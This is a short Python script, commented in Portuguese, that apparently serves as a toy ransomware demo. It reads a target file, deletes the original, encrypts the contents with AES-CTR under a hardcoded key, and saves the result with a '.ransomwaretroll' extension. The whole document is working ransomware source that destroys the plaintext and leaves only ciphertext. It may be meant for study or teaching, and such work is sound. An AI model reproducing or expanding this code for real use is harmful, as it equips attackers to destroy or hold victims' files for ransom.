import os
import pyaes

## Abrir o Arquivo a Ser Criptografado

file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()

## Remover o Arquivo

os.remove(file_name)


## Chave de Criptografia

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)


## Criptografar o arquivo

crypto_data = aes.encrypt(file_data)


## Salvar o Arquivo Criptografado

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
